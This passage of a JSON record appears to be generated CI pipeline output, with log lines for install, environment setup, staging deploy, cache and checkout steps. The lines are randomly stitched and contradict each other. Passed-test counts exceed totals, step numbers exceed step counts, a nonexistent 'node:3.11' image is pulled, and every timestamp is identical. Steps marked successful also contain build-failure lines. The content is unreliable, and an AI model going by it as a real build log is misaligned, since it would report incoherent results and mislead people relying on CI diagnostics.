          "[12:45:53] DEBUG: Loading configuration",
          "Loading...",
          "Pulling image: node:3.11",
          "[12:45:53] DEBUG: Loading configuration",
          "Step 7/19: Building",
          "Completed.",
          "[12:45:53] INFO: Request completed",
          "Creating production build...",
          "Compiling src/handler.rs...",
          "Waiting...",
          "[12:45:53] WARN: Deprecated API usage",
          "Compiling lib/utils.go...",
          "Tests: 289 passed, 318 total",
          "Verifying...",
          "Finished.",
          "Connection established",
          "[12:45:53] INFO: Request completed",
          "HEAD is now at 27049a1",
          "Finished.",
          "Fetching submodules...",
          "\u2713 All checks passed",
          "TLS handshake completed",
          "[12:45:53] WARN: Deprecated API usage",
          "Waiting...",
          "[12:45:53] DEBUG: Initializing service",
          "[12:45:53] WARN: Deprecated API usage",
          "[12:45:53] DEBUG: Query executed in 45ms",
          "Connection established",
          "Cache miss for key-6984",
          "Checking out master branch",
          "[12:45:53] DEBUG: Initializing service",
          "\u2713 All checks passed",
          "Success!",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u2713 Step 'install' succeeded",
          "Creating production build...",
          "Compiling components/service.java...",
          "Minifying main.js",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Compiling src/app.ts...",
          "WARNING: react has known vulnerabilities",
          "  PASS: e2e/test_db_connect.spec.js",
          "\u2713 Task completed in 2810ms",
          "[12:45:53] INFO: Connecting to database",
          "Image pulled successfully",
          "[12:45:53] INFO: Starting build process",
          "OK",
          "HEAD is now at 01db4ce",
          "Ready.",
          "Already up to date.",
          "Loading...",
          "Cache hit for key-6549",
          "Snapshots: 17 passed, 2 total",
          "[12:45:53] DEBUG: Initializing service",
          "Test Suites: 31 passed, 40 total",
          "Success!",
          "FAILED: test_auth_login",
          "Creating production build...",
          "npm install: added 171 packages",
          "Installing prettier@4.3.6",
          "Finished.",
          "Optimizing 18 modules...",
          "  PASS: e2e/test_cache_hit.spec.js",
          "Installing webpack@3.20.3",
          "Tests: 460 passed, 241 total",
          "  PASS: test_auth_login (68ms)",
          "Fetching from https://githubusercontent.com/package.json",
          "Layer 2/14: RUN command",
          "Already up to date.",
          "[12:45:53] INFO: Cache refreshed",
          "pip install: Successfully installed webpack-1.2",
          "\u2713 Task completed in 3642ms",
          "TLS handshake completed",
          "Artifact uploaded: build.tar.gz (30MB)",
          "Finished.",
          "pip: Collecting react",
          "yarn add: Done in 9.16s",
          "Success!",
          "Step 1/20: Running migrations",
          "Cache saved successfully",
          "\u2713 All checks passed",
          "NODE_ENV=production",
          "Bundling runtime.js",
          "Generating source maps...",
          "[12:45:53] INFO: Starting build process",
          "POST /data - 200 (262ms)",
          "\u2713 All checks passed",
          "npm install: resolved 235 packages",
          "npm install: added 452 packages",
          "Cache saved successfully",
          "[12:45:53] INFO: Starting build process",
          "yarn add: Done in 18.95s",
          "Fetching from https://github.com/package.json",
          "npm install: resolved 263 packages",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:45:53] WARN: Deprecated API usage",
          "Test Suites: 42 passed, 24 total",
          "[12:45:53] INFO: Cache refreshed",
          "[12:45:53] ERROR: Connection failed",
          "Building Docker image...",
          "Compiling lib/service.java...",
          "Time: 106.732s",
          "[12:45:53] DEBUG: Loading configuration",
          "  PASS: unit/test_auth_login.spec.js",
          "Using Node.js 18.8.6",
          "Step 4/16: Installing dependencies",
          "Cache restored successfully (486MB)",
          "FAILED: test_auth_login",
          "Pushing to registry...",
          "[12:45:53] INFO: Starting build process",
          "Compiling utils/service.java...",
          "Bundling styles.js",
          "Tests: 282 passed, 472 total",
          "yarn add: Done in 10.5s",
          "pip: Collecting axios",
          "Cache hit for key-9124",
          "Switched to branch 'hotfix/task-661'",
          "Artifact uploaded: dist.zip (89MB)",
          "Cache restored successfully (496MB)",
          "Step 15/22: Testing",
          "Time: 29.16s",
          "Compiling utils/handler.rs...",
          "Step 15/19: Deploying",
          "pip: Collecting webpack",
          "[12:45:53] INFO: Request completed",
          "Pushing to registry...",
          "Environment: test",
          "Snapshots: 32 passed, 19 total",
          "[12:45:53] INFO: Processing request",
          "Pushing to registry...",
          "  PASS: test_cache_hit (418ms)",
          "=== Step install_dependencies completed ==="
        ]
      },
      {
        "name": "setup_environment",
        "status": "success",
        "started_at": "2025-11-25T12:48:47.608018",
        "finished_at": "2025-11-25T12:49:01.044683",
        "log_lines": [
          "=== Step: setup_environment ===",
          "Time: 106.154s",
          "[12:45:53] WARN: Deprecated API usage",
          "  PASS: test_cache_hit (8ms)",
          "Ready.",
          "Creating production build...",
          "Generating source maps...",
          "Uploading artifact 'coverage' (18 files)",
          "Cache hit for key-6136",
          "[12:45:53] DEBUG: Memory usage: 501MB",
          "Installing express@1.11.8",
          "npm notice: package.json updated",
          "Artifact uploaded: dist.zip (58MB)",
          "Installing prettier@5.9.6",
          "Platform: linux-x64",
          "Platform: linux-x64",
          "[12:45:53] DEBUG: Initializing service",
          "yarn add: Done in 9.4s",
          "[12:45:53] INFO: Cache refreshed",
          "Loading...",
          "Installing prettier@5.7.2",
          "pip: Installing build dependencies...",
          "Bundling runtime.js",
          "Cache miss for key-8686",
          "Cache saved successfully",
          "Compiling utils/index.js...",
          "GET /api - 200 (100ms)",
          "Processing...",
          "Pulling image: alpine:latest",
          "Fetching from https://amazonaws.com/package.json",
          "Fetching submodules...",
          "Completed.",
          "Coverage: 85% statements, 80% branches",
          "Generating source maps...",
          "Image pulled successfully",
          "\u2713 deploy completed",
          "[12:45:53] WARN: Deprecated API usage",
          "Exception: NullPointerException",
          "Step 18/20: Linting",
          "Ran 128 tests in 15s",
          "\u2713 Task completed in 2748ms",
          "[12:45:53] DEBUG: Query executed in 86ms",
          "pip: Downloading prettier-5.2.tar.gz",
          "Done.",
          "Cache restored successfully (333MB)",
          "Pulling image: python:latest",
          "Coverage: 100% statements, 71% branches",
          "npm notice: package.json updated",
          "pip install: Successfully installed prettier-3.11",
          "WARNING: lodash has known vulnerabilities",
          "[12:45:53] DEBUG: Memory usage: 364MB",
          "Step 11/21: Deploying",
          "Ran 47 tests in 18s",
          "Loading...",
          "Using Python 3.10",
          "Artifact uploaded: dist.zip (47MB)",
          "Using Python 3.11",
          "npm install: resolved 998 packages",
          "Ready.",
          "\u2713 validate completed",
          "npm install: resolved 1296 packages",
          "Building Docker image...",
          "HEAD is now at 340777c",
          "Compiling src/main.py...",
          "Cache miss for key-4256",
          "Verifying...",
          "Already up to date.",
          "[12:45:53] DEBUG: Initializing service",
          "Building Docker image...",
          "Already up to date.",
          "GET /health - 204 (49ms)",
          "NODE_ENV=production",
          "Step 3/20: Deploying",
          "[12:45:53] ERROR: Connection failed",
          "Time: 6.754s",
          "yarn add: Done in 5.68s",
          "Connection established",
          "Completed.",
          "Image pulled successfully",
          "Artifact uploaded: dist.zip (41MB)",
          "\u2713 validate completed",
          "[12:45:53] DEBUG: Initializing service",
          "Pushing to registry...",
          "Completed.",
          "yarn add: Done in 25.83s",
          "Cache restored successfully (40MB)",
          "\u2713 deploy completed",
          "Installing webpack@1.13.8",
          "Ready.",
          "Artifact downloaded: 22MB",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Connection established",
          "pip: Collecting react",
          "Finished.",
          "Completed.",
          "Installing react@2.0.6",
          "Creating production build...",
          "[12:45:53] INFO: Cache refreshed",
          "Step 7/17: Linting",
          "Step 3/23: Linting",
          "Waiting...",
          "HEAD is now at 669014b",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:45:53] INFO: Cache refreshed",
          "\u2717 build failed with exit code 19",
          "Cache invalidated: build",
          "Uploading artifact 'build' (36 files)",
          "POST /upload - 200 (10ms)",
          "Waiting...",
          "GET /api - 204 (36ms)",
          "[12:45:53] DEBUG: Query executed in 54ms",
          "[12:45:53] INFO: Request completed",
          "Completed.",
          "Image pulled successfully",
          "POST /upload - 200 (209ms)",
          "\u2713 test completed",
          "[12:45:53] INFO: Connecting to database",
          "POST /data - 200 (293ms)",
          "Ready.",
          "[12:45:53] INFO: Processing request",
          "Generating source maps...",
          "npm install: resolved 1099 packages",
          "npm install: resolved 1555 packages",
          "Compiling utils/handler.rs...",
          "Artifact uploaded: dist.zip (15MB)",
          "Tests: 130 passed, 55 total",
          "Generating source maps...",
          "Optimizing 98 modules...",
          "OK",
          "Step 2/15: Running migrations",
          "\u2717 build failed with exit code 60",
          "GET /api - 201 (49ms)",
          "Using Python 3.10",
          "[12:45:53] WARN: Deprecated API usage",
          "Layer 1/12: ENV command",
          "\u2713 Step 'build' succeeded",
          "Step 11/22: Installing dependencies",
          "[12:45:53] INFO: Request completed",
          "pip install: Successfully installed react-1.4",
          "\u2713 build completed",
          "[12:45:53] DEBUG: Connection pool: 2 active",
          "Tests: 193 passed, 465 total",
          "\u2713 build completed",
          "Image pulled successfully",
          "GET /status - 201 (81ms)",
          "Processing...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Platform: linux-x64",
          "  PASS: test_api_health (424ms)",
          "WARNING: jest has known vulnerabilities",
          "GET /status - 201 (41ms)",
          "Fetching submodules...",
          "Transforming 273 files...",
          "Installing webpack@4.7.9",
          "Cache miss for key-4815",
          "Image pulled successfully",
          "[12:45:53] INFO: Request completed",
          "Environment: staging",
          "Success!",
          "[12:45:53] INFO: Connecting to database",
          "Building Docker image...",
          "Time: 105.341s",
          "[12:45:53] WARN: Deprecated API usage",
          "Transforming 937 files...",
          "Connection established",
          "Waiting...",
          "TLS handshake completed",
          "Pulling image: node:3.11",
          "NODE_ENV=development",
          "POST /api - 201 (377ms)",
          "Environment: test",
          "Building Docker image...",
          "Pulling image: node:latest",
          "Step 19/22: Running migrations",
          "[12:45:53] DEBUG: Initializing service",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:45:53] DEBUG: Initializing service",
          "Creating production build...",
          "Done.",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Checking out master branch",
          "Step 8/21: Running migrations",
          "[12:45:53] DEBUG: Loading configuration",
          "Step 9/24: Building",
          "Layer 3/8: ENV command",
          "Optimizing 92 modules...",
          "Compiling lib/utils.go...",
          "Using Node.js 19.18.0",
          "Compiling src/app.ts...",
          "[12:45:53] INFO: Cache refreshed",
          "Connection established",
          "Cache invalidated: dependencies",
          "NODE_ENV=test",
          "npm install: added 358 packages",
          "[12:45:53] DEBUG: Connection pool: 4 active",
          "Test Suites: 35 passed, 41 total",
          "[12:45:53] ERROR: Connection failed",
          "[12:45:53] WARN: Deprecated API usage",
          "[12:45:53] DEBUG: Query executed in 97ms",
          "pip: Installing build dependencies...",
          "Artifact uploaded: build.tar.gz (5MB)",
          "Compiling utils/app.ts...",
          "Cache restored successfully (408MB)",
          "Creating production build...",
          "Waiting...",
          "Step 8/18: Installing dependencies",
          "Finished.",
          "=== Step setup_environment completed ==="
        ]
      },
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-11-25T12:49:01.044683",
        "finished_at": "2025-11-25T12:49:14.481348",
        "log_lines": [
          "=== Step: deploy_staging ===",
          "[12:45:53] INFO: Cache refreshed",
          "Tests: 73 passed, 301 total",
          "Generating source maps...",
          "  PASS: test_auth_login (192ms)",
          "Completed.",
          "Time: 87.117s",
          "HEAD is now at a1cdd8e",
          "Switched to branch 'feature/task-446'",
          "Cache saved successfully",
          "Step 16/15: Building",
          "Step 4/25: Building",
          "Platform: win32-x64",
          "Compiling utils/utils.go...",
          "Loading...",
          "Platform: linux-x64",
          "Generating source maps...",
          "Test Suites: 43 passed, 23 total",
          "pip install: Successfully installed jest-4.10",
          "Creating production build...",
          "Step 20/19: Building",
          "yarn add: Done in 19.47s",
          "Step 13/23: Building",
          "Step 3/17: Running migrations",
          "Layer 2/10: RUN command",
          "yarn add: Done in 9.29s",
          "[12:45:53] INFO: Starting build process",
          "[12:45:53] INFO: Request completed",
          "Already up to date.",
          "Compiling lib/index.js...",
          "Fetching from https://pypi.org/package.json",
          "OK",
          "Step 1/24: Linting",
          "Building Docker image...",
          "Time: 53.434s",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "npm install: added 308 packages",
          "TLS handshake completed",
          "Cache miss for key-5179",
          "Platform: darwin-arm64",
          "Installing react@2.14.10",
          "Layer 4/12: RUN command",
          "npm install: resolved 483 packages",
          "Cache hit for key-4514",
          "pip: Collecting react",
          "\u2713 All checks passed",
          "Transforming 896 files...",
          "POST /upload - 201 (193ms)",
          "Cache invalidated: dependencies",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Done.",
          "Fetching submodules...",
          "[12:45:53] WARN: Deprecated API usage",
          "Cache hit for key-9759",
          "Loading...",
          "Checking out master branch",
          "Compiling src/handler.rs...",
          "  PASS: integration/test_auth_login.spec.js",
          "Success!",
          "[12:45:53] INFO: Request completed",
          "[12:45:53] DEBUG: Query executed in 33ms",
          "Artifact uploaded: build.tar.gz (38MB)",
          "Connection established",
          "[12:45:53] DEBUG: Query executed in 52ms",
          "WARNING: jest has known vulnerabilities",
          "Environment: development",
          "[12:45:53] INFO: Request completed",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "POST /data - 201 (209ms)",
          "POST /upload - 202 (454ms)",
          "yarn add: Done in 6.51s",
          "pip: Collecting eslint",
          "Completed.",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Compiling src/index.js...",
          "Optimizing 79 modules...",
          "[12:45:53] INFO: Cache refreshed",
          "Cache miss for key-6564",
          "Bundling main.css",
          "Pushing to registry...",
          "TLS handshake completed",
          "yarn add: Done in 29.76s",
          "npm notice: created a lockfile",
          "Success!",
          "pip install: Successfully installed axios-4.18",
          "Time: 15.288s",
          "Coverage: 89% statements, 89% branches",
          "npm install: added 161 packages",
          "Using Python 3.9",
          "[12:45:53] INFO: Cache refreshed",
          "[12:45:53] WARN: Deprecated API usage",
          "Artifact uploaded: dist.zip (79MB)",
          "FAILED: test_api_health",
          "[12:45:53] DEBUG: Memory usage: 1213MB",
          "Using Python 3.10",
          "pip: Downloading express-1.14.tar.gz",
          "\u2713 validate completed",
          "\u2713 validate completed",
          "[12:45:53] DEBUG: Initializing service",
          "Bundling runtime.js",
          "npm install: added 313 packages",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Fetching submodules...",
          "Platform: linux-x64",
          "pip: Collecting jest",
          "[12:45:53] INFO: Starting build process",
          "Test Suites: 44 passed, 17 total",
          "Step 9/18: Linting",
          "Pulling image: alpine:latest",
          "\u2713 Step 'setup' succeeded",
          "\u2713 validate completed",
          "Completed.",
          "Cache restored successfully (120MB)",
          "[12:45:53] DEBUG: Query executed in 26ms",
          "GET /api - 201 (75ms)",
          "Checking out develop branch",
          "[12:45:53] WARN: Deprecated API usage",
          "Installing lodash@4.11.1",
          "Processing...",
          "OK",
          "npm notice: package.json updated",
          "Compiling lib/main.py...",
          "[12:45:53] DEBUG: Initializing service",
          "Artifact uploaded: build.tar.gz (29MB)",
          "Cache hit for key-9468",
          "Finished.",
          "Finished.",
          "Compiling lib/index.js...",
          "Cache saved successfully",
          "Waiting...",
          "Pushing to registry...",
          "Platform: darwin-arm64",
          "Step 5/18: Deploying",
          "OK",
          "\u2717 build failed with exit code 10",
          "Cache saved successfully",
          "WARNING: express has known vulnerabilities",
          "WARNING: lodash has known vulnerabilities",
          "Compiling components/utils.go...",
          "POST /api - 202 (358ms)",
          "Platform: darwin-arm64",
          "Compiling components/main.py...",
          "Cache hit for key-6822",
          "yarn add: Done in 16.44s",
          "TLS handshake completed",
          "Coverage: 81% statements, 75% branches",
          "Cache invalidated: build",
          "npm notice: package.json updated",
          "Creating production build...",
          "npm install: resolved 305 packages",
          "Processing...",
          "Platform: darwin-arm64",
          "\u2717 build failed with exit code 74",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u2713 All checks passed",
          "OK",
          "Tests: 332 passed, 409 total",
          "pip: Installing build dependencies...",
          "Checking out master branch",
          "yarn add: Done in 19.26s",
          "Using Node.js 18.18.9",
          "  PASS: test_auth_login (75ms)",
          "[12:45:53] DEBUG: Memory usage: 1015MB",
          "Minifying vendor.js",
          "yarn add: Done in 13.44s",
          "Time: 42.564s",
          "HEAD is now at e64547f",
          "\u2717 build failed with exit code 16",
          "[12:45:53] INFO: Starting build process",
          "Time: 12.794s",
          "[12:45:53] WARN: Deprecated API usage",
          "TLS handshake completed",
          "pip: Installing build dependencies...",
          "Platform: win32-x64",
          "pip: Downloading jest-2.15.tar.gz",
          "Bundling styles.css",
          "Finished.",
          "pip: Collecting jest",
          "Verifying...",
          "Connection established",
          "[12:45:53] DEBUG: Query executed in 61ms",
          "Layer 10/10: RUN command",
          "POST /api - 200 (183ms)",
          "\u2713 All checks passed",
          "Step 19/24: Building",
          "Building Docker image...",
          "Step 4/17: Installing dependencies",
          "pip: Installing build dependencies...",
          "Connection established",
          "Finished.",
          "\u2713 All checks passed",
          "Generating source maps...",
          "Snapshots: 32 passed, 33 total",
          "Connection established",
          "Installing jest@3.11.5",
          "[12:45:53] INFO: Starting build process",
          "Compiling components/utils.go...",
          "Cache saved successfully",
          "HEAD is now at 69e90c8",
          "\u2713 Step 'checkout' succeeded",
          "Generating source maps...",
          "pip install: Successfully installed express-3.11",
          "pip install: Successfully installed express-4.18",
          "Ran 178 tests in 6s",
          "Step 1/16: Linting",
          "pip: Collecting axios",
          "npm notice: created a lockfile",
          "=== Step deploy_staging completed ==="
        ]
      },
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-11-25T12:49:14.481348",
        "finished_at": "2025-11-25T12:49:22.543347",
        "log_lines": [
          "=== Step: save_cache ===",
          "[12:45:53] INFO: Connecting to database",
          "Using Node.js 18.4.3",
          "[12:45:53] DEBUG: Loading configuration",
          "yarn add: Done in 2.99s",
          "TLS handshake completed",
          "Completed.",
          "yarn add: Done in 7.16s",
          "\u2713 All checks passed",
          "\u2713 package completed",
          "Image pulled successfully",
          "npm notice: created a lockfile",
          "Step 17/15: Running migrations",
          "Artifact uploaded: build.tar.gz (15MB)",
          "[12:45:53] WARN: Deprecated API usage",
          "NODE_ENV=production",
          "[12:45:53] DEBUG: Initializing service",
          "FAILED: test_cache_hit",
          "Environment: production",
          "Pushing to registry...",
          "Transforming 885 files...",
          "Pushing to registry...",
          "  PASS: integration/test_user_create.spec.js",
          "\u2713 Task completed in 3923ms",
          "Step 1/24: Linting",
          "[12:45:53] DEBUG: Initializing service",
          "Artifact uploaded: dist.zip (72MB)",
          "[12:45:53] INFO: Connecting to database",
          "WARNING: prettier has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u2713 Task completed in 468ms",
          "Tests: 83 passed, 383 total",
          "Cache miss for key-5590",
          "Uploading artifact 'coverage' (35 files)",
          "Compiling utils/utils.go...",
          "Artifact uploaded: dist.zip (18MB)",
          "Tests: 308 passed, 179 total",
          "GET /api - 201 (73ms)",
          "OK",
          "npm notice: package.json updated",
          "Using Python 3.12",
          "Step 16/22: Installing dependencies",
          "Step 17/22: Testing",
          "\u2717 build failed with exit code 55",
          "Minifying main.js",
          "Transforming 108 files...",
          "Step 11/24: Running migrations",
          "Fetching from https://registry.npmjs.org/package.json",
          "Coverage: 94% statements, 66% branches",
          "Completed.",
          "pip install: Successfully installed eslint-4.3",
          "pip: Installing build dependencies...",
          "[12:45:53] INFO: Connecting to database",
          "TLS handshake completed",
          "Building Docker image...",
          "Finished.",
          "Pushing to registry...",
          "  PASS: unit/test_cache_hit.spec.js",
          "Uploading artifact 'coverage' (9 files)",
          "Fetching from https://github.com/package.json",
          "[12:45:53] DEBUG: Memory usage: 613MB",
          "Time: 57.855s",
          "Cache saved successfully",
          "Step 16/21: Running migrations",
          "Tests: 171 passed, 229 total",
          "Ran 104 tests in 27s",
          "[12:45:53] INFO: Request completed",
          "Artifact downloaded: 47MB",
          "Test Suites: 19 passed, 21 total",
          "npm install: resolved 988 packages",
          "Cache saved successfully",
          "\u2713 Task completed in 4619ms",
          "Using Node.js 20.8.6",
          "Minifying vendor.js",
          "[12:45:53] DEBUG: Initializing service",
          "[12:45:53] INFO: Connecting to database",
          "Coverage: 91% statements, 74% branches",
          "Optimizing 45 modules...",
          "Pulling image: node:18",
          "Cache saved successfully",
          "[12:45:53] INFO: Cache refreshed",
          "Done.",
          "Cache saved successfully",
          "Uploading artifact 'build' (33 files)",
          "Step 19/16: Installing dependencies",
          "\u2713 package completed",
          "Step 19/25: Building",
          "Fetching from https://gcr.io/package.json",
          "Loading...",
          "Environment: development",
          "yarn add: Done in 19.24s",
          "Connection established",
          "\u2713 Task completed in 3978ms",
          "Completed.",
          "[12:45:53] INFO: Cache refreshed",
          "Success!",
          "[12:45:53] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Test Suites: 19 passed, 8 total",
          "Fetching submodules...",
          "Test Suites: 29 passed, 20 total",
          "  PASS: test_api_health (315ms)",
          "POST /data - 201 (103ms)",
          "Pulling image: python:3.11",
          "OK",
          "Completed.",
          "Step 20/22: Linting",
          "Step 1/25: Testing",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u2713 test completed",
          "\u2713 All checks passed",
          "Checking out develop branch",
          "Cache miss for key-7974",
          "\u2713 Step 'setup' succeeded",
          "Cache invalidated: node_modules",
          "WARNING: axios has known vulnerabilities",
          "Layer 1/10: ENV command",
          "Pushing to registry...",
          "Snapshots: 34 passed, 15 total",
          "\u2713 Task completed in 4985ms",
          "Fetching from https://githubusercontent.com/package.json",
          "Environment: test",
          "[12:45:53] INFO: Starting build process",
          "yarn add: Done in 6.65s",
          "Success!",
          "Artifact uploaded: build.tar.gz (25MB)",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (34MB)",
          "Coverage: 92% statements, 93% branches",
          "WARNING: axios has known vulnerabilities",
          "Layer 3/9: COPY command",
          "Checking out master branch",
          "Exception: TypeError",
          "Test Suites: 25 passed, 32 total",
          "Using Python 3.9",
          "Using Python 3.10",
          "Compiling src/service.java...",
          "Step 8/18: Testing",
          "Cache saved successfully",
          "Test Suites: 36 passed, 21 total",
          "Compiling components/utils.go...",
          "Step 14/21: Linting",
          "Minifying vendor.js",
          "npm install: resolved 1378 packages",
          "Processing...",
          "[12:45:53] INFO: Request completed",
          "yarn add: Done in 14.9s",
          "Compiling utils/handler.rs...",
          "\u2713 Step 'test' succeeded",
          "Compiling lib/index.js...",
          "[12:45:53] DEBUG: Query executed in 86ms",
          "Bundling main.css",
          "Step 20/19: Testing",
          "[12:45:53] DEBUG: Loading configuration",
          "Finished.",
          "Coverage: 71% statements, 71% branches",
          "Installing prettier@4.10.5",
          "  PASS: test_user_create (373ms)",
          "FAILED: test_cache_hit",
          "Snapshots: 32 passed, 37 total",
          "Transforming 533 files...",
          "Step 14/17: Building",
          "\u2717 build failed with exit code 110",
          "Completed.",
          "Checking out master branch",
          "Exception: ValueError",
          "Bundling main.js",
          "\u2713 package completed",
          "  PASS: test_cache_hit (263ms)",
          "yarn add: Done in 3.63s",
          "OK",
          "pip install: Successfully installed prettier-2.16",
          "pip: Downloading express-5.10.tar.gz",
          "Processing...",
          "WARNING: express has known vulnerabilities",
          "[12:45:53] INFO: Starting build process",
          "Step 20/25: Linting",
          "Optimizing 47 modules...",
          "npm install: added 231 packages",
          "NODE_ENV=test",
          "Creating production build...",
          "Using Python 3.11",
          "pip: Installing build dependencies...",
          "yarn add: Done in 18.66s",
          "POST /data - 202 (167ms)",
          "[12:45:53] WARN: Deprecated API usage",
          "Ran 13 tests in 53s",
          "npm install: added 418 packages",
          "Installing prettier@3.9.0",
          "Done.",
          "Transforming 729 files...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Step 7/23: Running migrations",
          "Transforming 175 files...",
          "Pushing to registry...",
          "Success!",
          "[12:45:53] WARN: Deprecated API usage",
          "Generating source maps...",
          "yarn add: Done in 29.49s",
          "OK",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "WARNING: express has known vulnerabilities",
          "Success!",
          "Already up to date.",
          "Verifying...",
          "Cache invalidated: node_modules",
          "Ready.",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-11-25T12:49:22.543347",
        "finished_at": "2025-11-25T12:49:27.918013",
        "log_lines": [
          "=== Step: checkout ===",
          "Step 1/16: Linting",
          "npm install: added 41 packages",
          "Cache hit for key-5616",
          "Creating production build...",
          "Generating source maps...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "GET /api - 204 (53ms)",
          "npm install: resolved 193 packages",
          "Image pulled successfully",
          "Fetching from https://amazonaws.com/package.json",
          "Transforming 699 files...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:45:53] WARN: Deprecated API usage",
          "WARNING: react has known vulnerabilities",
          "[12:45:53] DEBUG: Query executed in 85ms",
          "WARNING: eslint has known vulnerabilities",
          "Optimizing 43 modules...",
          "Cache saved successfully",
          "Ran 61 tests in 35s",
          "Cache saved successfully",
          "Step 20/23: Deploying",
          "Platform: darwin-arm64",
          "Cache hit for key-4041",
          "Artifact downloaded: 27MB",
          "WARNING: webpack has known vulnerabilities",
          "[12:45:53] INFO: Connecting to database",
          "Step 5/24: Linting",
          "WARNING: webpack has known vulnerabilities",
          "WARNING: webpack has known vulnerabilities",
          "Pulling image: alpine:18",
          "pip: Downloading lodash-4.14.tar.gz",
          "WARNING: react has known vulnerabilities",
          "Fetching submodules...",
          "Step 15/23: Running migrations",
          "Installing jest@4.20.10",
          "  PASS: unit/test_api_health.spec.js",
          "Done.",
          "Platform: darwin-arm64",
          "yarn add: Done in 26.48s",
          "Verifying...",
          "HEAD is now at 24bec07",
          "\u2713 validate completed",
          "[12:45:53] INFO: Cache refreshed",
          "Done.",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "WARNING: lodash has known vulnerabilities",
          "Using Node.js 17.14.4",
          "POST /data - 202 (27ms)",
          "Uploading artifact 'dist' (21 files)",
          "FAILED: test_api_health",
          "npm notice: package.json updated",
          "pip: Installing build dependencies...",
          "GET /health - 200 (40ms)",
          "Minifying vendor.js",
          "Pushing to registry...",
          "Switched to branch 'hotfix/task-862'",
          "[12:45:53] DEBUG: Connection pool: 7 active",
          "Creating production build...",
          "npm notice: created a lockfile",
          "Verifying...",
          "[12:45:53] INFO: Processing request",
          "Compiling lib/app.ts...",
          "[12:45:53] DEBUG: Loading configuration",
          "pip: Downloading lodash-3.0.tar.gz",
          "pip: Installing build dependencies...",
          "Artifact uploaded: dist.zip (71MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u2713 package completed",
          "[12:45:53] WARN: Deprecated API usage",
          "pip: Installing build dependencies...",
          "Artifact downloaded: 9MB",
          "Installing lodash@2.16.8",
          "[12:45:53] WARN: Deprecated API usage",
          "pip: Downloading prettier-3.9.tar.gz",
          "pip: Downloading lodash-2.14.tar.gz",
          "Ready.",
          "Compiling src/service.java...",
          "Checking out master branch",
          "Cache miss for key-2078",
          "Processing...",
          "Building Docker image...",
          "[12:45:53] WARN: Deprecated API usage",
          "Fetching submodules...",
          "POST /api - 202 (175ms)",
          "Completed.",
          "Loading...",
          "Ran 92 tests in 21s",
          "NODE_ENV=development",
          "Connection established",
          "Verifying...",
          "Step 17/25: Deploying",
          "[12:45:53] ERROR: Connection failed",
          "Optimizing 86 modules...",
          "Step 4/15: Deploying",
          "[12:45:53] INFO: Cache refreshed",
          "[12:45:53] DEBUG: Loading configuration",
          "Step 15/23: Building",
          "Bundling main.js",
          "Platform: darwin-arm64",
          "NODE_ENV=development",
          "Platform: darwin-arm64",
          "FAILED: test_api_health",
          "\u2713 All checks passed",
          "Cache miss for key-2232",
          "npm install: added 385 packages",
          "Minifying vendor.js",
          "Switched to branch 'bugfix/task-251'",
          "Environment: development",
          "[12:45:53] ERROR: Connection failed",
          "Cache hit for key-9811",
          "Checking out main branch",
          "Checking out master branch",
          "Environment: development",
          "pip install: Successfully installed lodash-1.3",
          "Step 2/20: Building",
          "TLS handshake completed",
          "Step 5/22: Linting",
          "Artifact downloaded: 16MB",
          "Waiting...",
          "  PASS: unit/test_api_health.spec.js",
          "Artifact downloaded: 24MB",
          "Pushing to registry...",
          "\u2713 Step 'test' succeeded",
          "npm install: added 227 packages",
          "Checking out main branch",
          "[12:45:53] DEBUG: Connection pool: 11 active",
          "Waiting...",
          "Generating source maps...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:45:53] DEBUG: Loading configuration",
          "Transforming 688 files...",
          "\u2713 Step 'install' succeeded",
          "npm notice: created a lockfile",
          "Layer 5/10: RUN command",
          "[12:45:53] INFO: Starting build process",
          "\u2717 build failed with exit code 102",
          "Uploading artifact 'dist' (33 files)",
          "Processing...",
          "Artifact uploaded: dist.zip (49MB)",
          "Artifact uploaded: dist.zip (47MB)",
          "Step 17/19: Testing",
          "\u2713 Step 'test' succeeded",
          "npm notice: package.json updated",
          "[12:45:53] ERROR: Connection failed",
          "npm install: added 321 packages",
          "  PASS: e2e/test_auth_login.spec.js",
          "Cache miss for key-5503",
          "HEAD is now at 0953fe5",
          "Installing jest@3.16.6",
          "WARNING: lodash has known vulnerabilities",
          "Compiling components/utils.go...",
          "Snapshots: 8 passed, 35 total",
          "[12:45:53] DEBUG: Query executed in 19ms",
          "WARNING: express has known vulnerabilities",
          "Cache saved successfully",
          "Already up to date.",
          "npm notice: package.json updated",
          "Artifact uploaded: build.tar.gz (48MB)",
          "Building Docker image...",
          "Success!",
          "Compiling lib/utils.go...",
          "npm notice: package.json updated",
          "Environment: production",
          "Building Docker image...",
          "Time: 42.221s",
